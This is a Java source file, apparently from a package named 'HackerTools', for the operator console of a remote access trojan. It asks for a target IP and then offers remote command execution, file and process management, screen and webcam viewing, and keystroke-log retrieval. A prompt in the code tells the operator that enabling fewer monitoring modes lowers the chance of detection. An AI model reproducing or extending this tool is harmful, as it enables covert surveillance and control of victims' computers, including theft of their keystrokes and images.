package HackerTools;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.net.UnknownHostException;
import java.util.Enumeration;

import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JRootPane;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.UIManager;
import javax.swing.WindowConstants;
import javax.swing.plaf.FontUIResource;

public class Index {
    public static String ipAddress = Index.ipAddress;

    public static boolean ctrl_camera = true;
    public static boolean ctrl_screen = true;
    public static boolean ctrl_keyboardRecord = true;

    public static void main(String[] args) throws Exception {

        DrawGUI drawGUI = new DrawGUI();
        drawGUI.Init(); // 对组件进行初始化
        drawGUI.draw_MainWindow();

        // 选择控制模式，可以降低被发现的概率
        ipAddress = JOptionPane.showInputDialog("请输入对方ip：");
        String[] possibleValues = { "全部", "不包含键盘记录", "不包含影像记录", "仅包含cmd" };
        String selectedValue = (String) JOptionPane.showInputDialog(null,
                "Hint：选择较少的监控模式可以降低被发现的概率", "请选择在后台开启的服务",
                JOptionPane.INFORMATION_MESSAGE, null, possibleValues,
                possibleValues[0]);
        mode_choose mode_choose = new mode_choose(selectedValue);
        System.out.println(ctrl_screen);
        /*
         * JFrame.setDefaultLookAndFeelDecorated(true);
         * JDialog.setDefaultLookAndFeelDecorated(true);
         *
         * SwingUtilities.invokeLater(new Runnable() { public void run() {
         * SubstanceLookAndFeel.setSkin(new BusinessBlackSteelSkin()); try {
         *
         * } catch (Exception e) { e.printStackTrace(); } } });
         */

        // 进程一开启就开始接收图像文件
        if (ctrl_screen) {
            Thread thread1 = new Thread() {
                public void run() {
                    PictureView PictureView = new PictureView();
                    ClientScreenMonitor ClientScreenMonitor = new ClientScreenMonitor(
                            8000);
                }
            };
            thread1.start();
        }
        if(ctrl_keyboardRecord){

            Thread thread1 = new Thread() {
                public void run() {
                    ClientKeyboardRecord client_keyboardRecord = new ClientKeyboardRecord();
                    try {
                        client_keyboardRecord.receive();
                        Thread.sleep(3*60000); //一开启程序读取当天键盘记录，每3分钟更新
                    } catch (UnknownHostException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    } catch (InterruptedException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            };
            thread1.start();
        }
        ToolBar.lightBtn.setText("已成功连接");
        ToolBar.lightBtn.setIcon(new ImageIcon("lvdengxia.png"));

    }

}

class DrawGUI {
    public static JFrame jf = new JFrame();
    public static JTextField cmdField = new JTextField("请输入cmd命令", 30);

    public static void Init() {
        ToolBar.create_ToolBar(jf); // 全局变量toolbar的初始化，此后直接调用即可
    }

    public static void draw_MainWindow() {

        int frame_width = 800;
        int frame_height = 200;

        FontUIResource fontUIResource = new FontUIResource(new Font("宋体",
                Font.PLAIN, 12));
        for (Enumeration keys = UIManager.getDefaults().keys(); keys
                .hasMoreElements();) {
            Object key = keys.nextElement();
            Object value = UIManager.get(key);
            if (value instanceof FontUIResource) {
                UIManager.put(key, fontUIResource);
            }
        }

        jf = new JFrame("主界面");
        jf.setSize(frame_width, frame_height);
        jf.setLocationRelativeTo(null);
        jf.setLayout(null);
        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        jf.setUndecorated(true);

        // 创建 内容面板，使用 边界布局
        JPanel panel = new JPanel();

        ToolBar toolBar = new ToolBar();
        // 添加 工具栏 到 内容面板 的 顶部
        panel.add(toolBar.toolBar, BorderLayout.PAGE_START);
        // 添加 文本区域 到 内容面板 的 中间

        // 设置cmd的输入框
        FontUIResource font_textfield = new FontUIResource(new Font("宋体",
                Font.PLAIN, 20));
        cmdField.setFont(fontUIResource);
        cmdField.setBounds(0, 400, 600, 80);
        cmdField.setFont(font_textfield);
        cmdField.setLocation(20, 600);

        // 设置cmd命令的发送按钮
        JButton cmdButton = new JButton();
        cmdButton.setText("发送命令");
        cmdButton.setFont(font_textfield);
        cmdButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    Thread thread = new Thread() {
                        public void run() {
                            ClientCmd client_cmd = new ClientCmd(7888, Index.ipAddress, cmdField.getText());
                            try {
                                client_cmd.recieveresult();
                            } catch (IOException e) {
                                // TODO Auto-generated catch block
                                e.printStackTrace();
                            }
                        }
                    };// 读取图片，需要新开一个线程；
                    thread.start();

                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                    JOptionPane.showMessageDialog(null, "请开启服务端后重试");
                }
            }
        });

        jf.getRootPane().setWindowDecorationStyle(JRootPane.PLAIN_DIALOG);
        jf.setContentPane(panel);
        jf.add(cmdField);
        jf.add(cmdButton);
        jf.setVisible(true);

        ToolBar.jf_front = jf;
    }

    public static Color toColorFromString(String colorStr) {
        colorStr = colorStr.substring(4);
        Color color = new Color(Integer.parseInt(colorStr, 16));
        // java.awt.Color[r=0,g=0,b=255]
        return color;
    }

}

class ToolBar {
    public static JToolBar toolBar = new JToolBar();
    public static JFrame jf_front;
    static Thread thread_cache;
    public static JButton lightBtn;

    public static void create_ToolBar(final JFrame jf) {
        // 创建 一个工具栏实例,并设置样式
        int frame_width = 800;
        int frame_height = 600;

        toolBar.setBorderPainted(true);
        toolBar.setPreferredSize(new Dimension(frame_width, 40));

        // 创建 工具栏按钮
        JButton videoBtn = new JButton("视频监控");
        JButton procBtn = new JButton("进程管理");
        JButton fileBtn = new JButton("文件管理");
        JButton cameraBtn = new JButton("打开摄像头");
        JButton cmdBtn = new JButton("命令行");
        JButton keyBtn = new JButton("键盘记录");
        JButton blockBtn = new JButton(" ");
        blockBtn.setBorderPainted(false);
        blockBtn.setContentAreaFilled(false);// 用于占位置，排版
        blockBtn.setFocusPainted(false);
        lightBtn = new JButton("未连接");
        lightBtn.setIcon(new ImageIcon("hongdeng.png"));
        lightBtn.setFocusPainted(false);

        videoBtn.setPreferredSize(new Dimension(100, 40));
        procBtn.setPreferredSize(new Dimension(100, 40));
        fileBtn.setPreferredSize(new Dimension(100, 40));
        cameraBtn.setPreferredSize(new Dimension(100, 40));
        cmdBtn.setPreferredSize(new Dimension(100, 40));
        blockBtn.setPreferredSize(new Dimension(80, 40));
        lightBtn.setPreferredSize(new Dimension(100, 40));
        keyBtn.setPreferredSize(new Dimension(100, 40));

        Font f = new Font("宋体", Font.PLAIN, 18);// 根据指定字体名称、样式和磅值大小，创建一个新 Font。
        videoBtn.setFont(f);
        procBtn.setFont(f);
        fileBtn.setFont(f);
        cameraBtn.setFont(f);
        cmdBtn.setFont(f);
        blockBtn.setFont(f);
        keyBtn.setFont(f);
        lightBtn.setFont(f);

        // 添加 按钮 到 工具栏
        toolBar.add(videoBtn);
        toolBar.add(procBtn);
        toolBar.add(fileBtn);
        toolBar.add(cameraBtn);
        toolBar.add(cmdBtn);
        toolBar.add(keyBtn);
        toolBar.add(blockBtn);
        toolBar.add(lightBtn);

        // 添加 按钮 的点击动作监听器，并把相关信息输入到 文本区域
        videoBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                if (thread_cache != null)
                    thread_cache.stop(); // 停止camera线程
                PictureView.jf.dispose();

                final Thread thread1 = new Thread() {
                    public void run() {
                        try {
                            ClientScreenMonitor.play_picture();
                        } catch (IOException e) {
                            // TODO Auto-generated catch block
                            e.printStackTrace();
                        }
                    }
                };
                ClientScreenMonitor.mythread = thread1;
                thread1.start();
            }
        });
        procBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    if (thread_cache != null)
                        thread_cache.stop(); // 停止camera线程

                    if (jf_front == null) {
                        jf_front = jf;
                        jf.dispose();
                        System.out.println("好惨呀！！！！");
                    }// 处理jf一开始为空的问题
                    if (jf_front.getTitle().equals("进程管理") == false) {
                        FileProcManager FileProcManager = new FileProcManager();
                        FileProcManager.client_procManagerSocket1();
                        PictureView.jf.dispose();
                        jf_front.dispose();// 主界面的释放
                        FileProcManager.client_procManagerUI.jf
                                .setTitle("进程管理");// 设置标题
                        FileProcManager.client_procManagerUI.jf
                                .setVisible(true);// 设置可见
                        jf_front = FileProcManager.client_procManagerUI.jf;
                    }
                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }
            }
        });
        fileBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    if (thread_cache != null)
                        thread_cache.stop(); // 停止camera线程

                    if (jf_front == null) {
                        jf_front = jf;
                        jf.dispose();
                    }// 处理jf一开始为空的问题
                    if (jf_front.getTitle().equals("文件管理") == false) {
                        FileProcManager FileProcManager = new FileProcManager();
                        FileProcManager.client_fileManagerSocket1();
                        PictureView.jf.dispose();
                        jf_front.dispose();// 主界面的释放
                        FileProcManager.client_fileManagerUI.jf
                                .setTitle("文件管理");// 设置标题
                        FileProcManager.client_fileManagerUI.jf
                                .setVisible(true);// 设置可见
                        jf_front = FileProcManager.client_fileManagerUI.jf;
                    }
                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }
            }
        });
        cameraBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    if (thread_cache != null)
                        thread_cache.stop(); // 停止camera线程

                    if (jf_front == null) {
                        jf_front = jf;
                        jf.dispose();
                    }// 处理jf一开始为空的问题
                    if (jf_front.getTitle().equals("打开摄像头") == false) {
                        /* 这便是网络传输的代码 */

                        thread_cache = new Thread() {
                            public void run() {
                                jf_front.dispose();// 主界面的释放
                                PictureView.show_PictureView();
                                PictureView.jf.setTitle("打开摄像头");// 设置标题

                                jf_front = PictureView.jf;
                            }
                        };// 读取图片，需要新开一个线程；
                        thread_cache.start();
                    }
                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }
            }
        });
        cmdBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    if (thread_cache != null)
                        thread_cache.stop(); // 停止camera线程

                    if (jf_front == null) {
                        jf_front = jf;
                        PictureView.jf.dispose();
                        jf.dispose();
                    }// 处理jf一开始为空的问题
                    if (jf_front.getTitle().equals("命令行") == false) {
                        PictureView.jf.setVisible(false);
                        PictureView.jf.dispose();
                        jf_front.dispose();// 主界面的释放
                        DrawGUI.draw_MainWindow();
                        DrawGUI.jf.setTitle("命令行");
                        DrawGUI.jf.setVisible(true);
                        jf_front = DrawGUI.jf;
                    }
                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                }
            }
        });
        keyBtn.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                try {
                    ClientKeyboardRecord.receive();
                    JOptionPane.showMessageDialog(null, "已接收键盘记录在根目录");
                } catch (Exception e1) {
                    // TODO Auto-generated catch block
                    e1.printStackTrace();
                    JOptionPane.showMessageDialog(null, "请开启服务端后重试");
                }
            }
        });
    }
}

// 用于选择监控模式
class mode_choose {
    public mode_choose(String str) {
        if (str.equals("全部")) {
            Index.ctrl_camera = true;
            Index.ctrl_screen = true;
            Index.ctrl_keyboardRecord = true;
        } else if (str.equals("不包含键盘记录")) {
            Index.ctrl_camera = true;
            Index.ctrl_screen = true;
            Index.ctrl_keyboardRecord = false;
        } else if (str.equals("不包含影像记录")) {
            Index.ctrl_camera = false;
            Index.ctrl_screen = false;
            Index.ctrl_keyboardRecord = true;
        } else {
            Index.ctrl_camera = false;
            Index.ctrl_screen = false;
            Index.ctrl_keyboardRecord = false;
        }
    }
}